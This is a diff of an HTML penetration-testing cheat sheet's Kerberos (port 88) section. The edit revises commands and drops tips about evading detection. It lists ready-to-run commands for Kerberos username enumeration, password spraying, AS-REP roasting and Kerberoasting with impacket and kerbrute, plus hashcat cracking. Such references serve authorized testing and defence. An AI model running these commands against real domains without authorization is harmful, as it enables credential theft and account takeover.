@@ -5418,19 +5418,20 @@
 <h1 id="kerberos-88">Kerberos (88)<a class="headerlink" href="#kerberos-88" title="Permanent link">&para;</a></h1>
 <div class="admonition tip">
 <p class="admonition-title">Start here</p>
-<p>Port 88 open means you're looking at a domain controller. Start with username enumeration (no creds needed): <code>kerbrute userenum -d $DOMAIN --dc $DC_IP userlist.txt</code>. Then immediately try ASREPRoasting, accounts without pre-auth required hand you crackable hashes.</p>
+<p>Port 88 identifies a Kerberos KDC; in an Active Directory environment this is normally a domain controller. Establish the realm/domain before username enumeration or AS-REP roasting.</p>
 </div>
 <hr />
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="w"> </span>krb5-enum-users<span class="w"> </span><span class="nv">$DC_IP</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span><span class="nv">$DC_IP</span>
 </code></pre></div>
 <hr />
 <h2 id="username-enumeration">Username Enumeration<a class="headerlink" href="#username-enumeration" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>kerbrute<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="w"> </span>krb5-enum-users<span class="w"> </span>--script-args<span class="o">=</span><span class="s2">&quot;krb5-enum-users.realm=</span><span class="nv">$DOMAIN</span><span class="s2">,userdb=users.txt&quot;</span><span class="w"> </span><span class="nv">$DC_IP</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>kerbrute<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>users.txt
 </code></pre></div>
 <hr />
 <h2 id="password-spraying">Password Spraying<a class="headerlink" href="#password-spraying" title="Permanent link">&para;</a></h2>
-<p>Validate a single password against every user in one shot. Significantly stealthier than SMB spraying. Kerberos pre-auth failures log Event ID 4771 (not 4625 like SMB), and most SIEM rules are tuned to SMB lockouts first.</p>
+<p>Validate a single approved password against a scoped user list. In Active Directory, Kerberos pre-authentication failures generate Event ID 4771 and can trigger lockouts or detection just like other authentication spraying.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>users.txt<span class="w"> </span><span class="s1">&#39;Winter2024!&#39;</span>
 </code></pre></div>
 <p>To spray a small credential set without triggering lockouts, respect the domain lockout threshold (<code>nxc smb $DC_IP -u '' -p '' --pass-pol</code> or query from LDAP) and keep attempts well under it.</p>
@@ -5441,21 +5442,17 @@
 <hr />
 <h2 id="asreproasting-no-credentials">ASREPRoasting (No Credentials)<a class="headerlink" href="#asreproasting-no-credentials" title="Permanent link">&para;</a></h2>
 <p>Accounts with pre-authentication disabled return a crackable AS-REP hash without any password.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>asrep-hashes.txt
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>impacket-GetNPUsers<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-no-pass<span class="w"> </span>-request<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>asrep-hashes.txt
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep-hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
 <hr />
 <h2 id="kerberoasting-requires-valid-credentials">Kerberoasting (Requires Valid Credentials)<a class="headerlink" href="#kerberoasting-requires-valid-credentials" title="Permanent link">&para;</a></h2>
 <p>Request TGS tickets for accounts with SPNs, the encrypted tickets are crackable offline.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/&lt;user&gt;:&lt;pass&gt;<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>tgs-tickets.txt
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>impacket-GetUserSPNs<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USERNAME</span><span class="s2">:</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>tgs-tickets.txt
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>tgs-tickets.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
-<div class="admonition tip">
-<p class="admonition-title">Real-world</p>
-<p>ASREPRoasting is low-noise and requires zero credentials. Run it as soon as you have a username list. Kerberoasting requires a foothold but is very effective against service accounts that haven't had their passwords rotated. Both attacks are noisy in event logs (4768/4769) but rarely alert on modern deployments unless specifically tuned.</p>
-</div>
 
 
 
